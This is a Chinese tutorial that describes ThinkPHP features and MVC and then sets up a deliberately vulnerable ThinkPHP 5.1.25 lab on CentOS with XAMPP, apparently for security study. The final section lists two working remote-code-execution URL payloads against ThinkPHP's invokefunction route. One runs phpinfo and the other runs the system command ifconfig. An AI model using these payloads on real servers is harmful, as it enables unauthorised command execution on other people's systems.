[TOC]



# ==CentOS7-xampp5.6安装ThinkPHP-5.1.25==

## 一、常用PHP开发框架

（1）ThinkPHP

（2）Laverel PHP

（3）Zend Framework

### 1、ThinkPHP框架的作用

（1）路由规则: 用于在开发过程中定义后台接口的地址标准，以便于前端页面的请求能够发送给正确的服务器地址。

（2）参数传递: 也是属于后台接口的标准，用于接收前端页面发过来的数据，无论是Get还是Post请求或者其他类型的请求。

（3）URL重定向: 当后台服务器处理完后需要重定向到一个新的页面时，通过URL重定向功能来实现。当然，后台重定向的本质仍然是通过发送给前端一个带Location字段的302状态码的响应，进而让前端进行重定向。

（4）Session和Cookie: 支持通过使用Session和Cookie来维持客户端与服务器端的状态。

（5）模块化: 服务器端的功能通常比较复杂，通常会将不同的功能划分到后台不同的模块中以便于管理和维护代码,ThinkPHP通过容器和依赖注入机制实现了不同功能的模板化处理。

（6）中间件: 中间件主要用于拦截或过滤应用的HTTP请求，并进行必要的业务处理。比如对于用户必须要登录成功后之能访问的接口，使用中间件就可以极大地提高代码的重用性，而不需要在每一个接口都对用户是否登录或权限是否满足进
行判断。

（7）模板引擎: 为了更加便捷地往前面HTML页面中填充数据，ThinkPHP内置了ThinkTemplate模块引擎，通过在HTML页面中嵌入一段满足模板语法规则的代码，可以快速将数据填充到HTML页面中供浏览器渲染。

（8）数据库操作:几乎所有的服务器环境必须支持数据库的各类操作，ThinkPHP同样内置了相应的库来操作MySQL数据库，当然也支持其他数据库。ThinkPHP通过定义一套标准接口来实现数据库的ORM操作和针对不同数据库的统一接口封装。在ThinkPHP中完全不需要写一行原生SOL，而是通过关系映射将表结构映射成了对象实现了高度的封装。一来代码更加灵活，二来可维护性更强，再者，更容易实现不同数据库类型的切换。

（9）验证器: 验证器用于在接口中快速对前端参数和数据进行合法性校验，代替在每个接口中使用大量i.f..else...代码和手写错误消息。ThinkPHP内置了多种验证器，包括格式类验证、长度和区间类验证、字段比较类验证、正则表达式验证等

（10）门面: 门面为容器中的类提供了一个静态调用接口，相比于传统的静态方法调用， 带来了更好的可测试性和扩展性，ThinkPHP通过门面可以为任何的非静态类库定义一个facade类，从而实现非静态方法的静态调用，省略了实例化类对象的过程。

（11）助手函数: ThinkPHP的所有操作方法均通过类和方法提供接口调用，即使通过门面进行方法调用，依然需要引入命名空间。而通过助手函数，则直接将常用的接口调用封装到函数中，在需要调用的地方直接调用函数，相对更加方便.

缓存支持:ThinkPHP内置了缓存服务器支持，默认使用文件作为缓存，也可以支持对Redis、MemCached、SOLlite等进行缓存。

### 2、MVC分层模式

MVC全名是Model View Controller，是模型(Model)-视图(View)-控制器(Controller)的缩写。它一种软件设计模式，通过代码组织和分层，将业务逻辑、数据处理、界面显示进行分离，以实现更高的重用性，更明确的代码功能，并能提高代码的维护性。MVC通过将业务逻辑封装到一个部件里面，在改进和个性化定制前端界面及用户交互的同时，不需要重新编写业务逻辑层代码。MVC三个部分的主要功能如下。

（1）Model层: 模型层主要负责处理应用程序中数据逻辑的部分，如数据库操作。

（2）Controller层: 控制层负责从视图读取数据，控制用户输入，并向模型发送数据，也同时对应着有一个服务器端的接
口暴露给前端，

（3）View层:视图层主要用于程序中处理数据显示的部分，简单来说就是前端界面 。

![image-20240828161350882](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240828161350882.png)

## 二、安装配置Composer

为了获取到ThinkPHP不同版本用于构造测试环境，需要首先安装Composer。Composer是PHP中用来管理依赖(dependency)关系的工具。你可以在自己的项目中声明所依赖的外部工具库(libraries)，Composer会帮你安装这些依赖的库文件。在之前学习ThinkPHP框架时我们也使用过Composer来在线安装ThinkPHP。本节内容主要了解一下如何在Linux环境中安装和使用。

### 1、配置PHP运行环境

默认情况下，只要安装了Xampp，或者任意一个Lamp环境，或者直接安装PHP，都表明系统环境中已经安装好PHP的主命令，只是并不一定说PHP会被安装在默认的/usr/local/bin目录下，以192.168.230.188服务器的Xampp环境为例，需要先配置一个软连接从 /opt/lampp/bin/php 到 /usr/local/bin 。

```shell
ln -s /opt/lampp/bin/php /usr/local/bin/php
```

上述命令将/usr/local/bin/php指向/opt/lampp/bin/php，这样，我们就可以在任意目录下直接执行 php 命令(代替配置环境变量)。

### 2、下载composer并进行安装

```shell
curl -sS https://getcomposer.org/installer | php
```

上述命令表示从https://getcomposer.org下载installer程序，并交由php命令执行，这样，便会在当前目录中安装好
composerphar.

### 3、将composer.phar移动到/usr/local/bin目录并重命名为composer

```shell
mv composer.phar /usr/local/bin/composer
```

### 4、配置composer使用国内镜像

```
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
composer config -g repo.packagist composer https://packagist.phpcomposer.com
```

上述镜像二选一。另外，出于安全考虑，composer不建议以root用户执行命令，但是也可以忽略继续执行。如果出现错误信息，则根据错误信息进行处理即可。至此，composer安装完成

完成Composer安装后，请确保composer.bat可执行文件路径添加到操作系统的环境变量Path中便于在命令中可以执行composer命令。同时，为了更加快速地下载依赖文件，建议修改为国内镜像，运行命令“composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/”可将镜像地址修改为阿里云的地址

## 三、安装ThinkPHP-5.1.25

### 1、安装5.1.25版本

此处我们以ThinkPHP 5.1.X的中间版本为例来进行演示。先进入网站https://packagist.org/packages/topthink/framework 查看ThinkPHP的具体的版本号，选择一个中间版本进行安装，比如此处选择5.1.25这个版本进行安装。

```shell
[root@mycentos bin]# cd /opt/lampp/htdocs/
[root@mycentos htdocs]# composer create-project topthink/think tpdemo 5.1.25 --prefer-dist
Do not run Composer as root/super user! See https://getcomposer.org/root for details
Continue as root/super user [yes]? yes
Creating a "topthink/think" project at "./tpdemo"
Installing topthink/think (v5.1.25)
  - Downloading topthink/think (v5.1.25)
  - Installing topthink/think (v5.1.25): Extracting archive
Created project in /opt/lampp/htdocs/tpdemo
Loading composer repositories with package information
Updating dependencies
Lock file operations: 2 installs, 0 updates, 0 removals
  - Locking topthink/framework (v5.1.42)
  - Locking topthink/think-installer (v2.0.5)
Writing lock file
Installing dependencies from lock file (including require-dev)
Package operations: 2 installs, 0 updates, 0 removals
  - Downloading topthink/think-installer (v2.0.5)
  - Downloading topthink/framework (v5.1.42)
topthink/think-installer contains a Composer plugin which is currently not in your allow-plugins config. See https://getcomposer.org/allow-plugins
Do you trust "topthink/think-installer" to execute code and wish to enable it now? (writes "allow-plugins" to composer.json) [y,n,d,?] y
  - Installing topthink/think-installer (v2.0.5): Extracting archive
  - Installing topthink/framework (v5.1.42): Extracting archive
Generating autoload files

```

上述命令会在 /opt/lampp/htdocs 目录下，安装tpdemo项目目录，但是从命令执行过程可以看出，composer强制将5.1.25的版本升级到了5.1.41的最新版本。那么如何指定只安装5.1.25的版本呢，此时我们进入/opt/lampp/htdocs/tpdemo目录下，修改composer.json，强制指定为5.1.25版本，然后在当前目录下进行降级处
理。

```shell
[root@mycentos htdocs]# cd tpdemo/
[root@mycentos tpdemo]# vi composer.json

    "require": {
        "php": ">=5.6.0",
        "topthink/framework": "5.1.25"
    },

```

在 /opt/lampp/htdocs/tpdemo目录下，执行以下命令完成降级:

```shell
[root@mycentos tpdemo]# composer update
Do not run Composer as root/super user! See https://getcomposer.org/root for details
Continue as root/super user [yes]? yes
Loading composer repositories with package information
Updating dependencies
Lock file operations: 0 installs, 1 update, 0 removals
  - Downgrading topthink/framework (v5.1.42 => v5.1.25)
Writing lock file
Installing dependencies from lock file (including require-dev)
Package operations: 0 installs, 1 update, 0 removals
  - Downloading topthink/framework (v5.1.25)
  - Downgrading topthink/framework (v5.1.42 => v5.1.25): Extracting archive
Generating autoload files
```

### 2、确认安装成功及版本号

启动Xampp，访问“http://192.168.230.188/tpdemo/public/”，如果出现默认首页，说明安装成功。

![image-20240828220857249](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240828220857249.png)

任意构造一个错误链接，确认详细版本号：

![image-20240828220947084](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240828220947084.png)

### 3、ThinkPHP已知漏洞Payload

```
192.168.230.188/tpdemo/public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```

![image-20240828215910480](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240828215910480.png)

```
192.168.230.188/tpdemo/public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ifconfig
```

![image-20240828215954105](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240828215954105.png)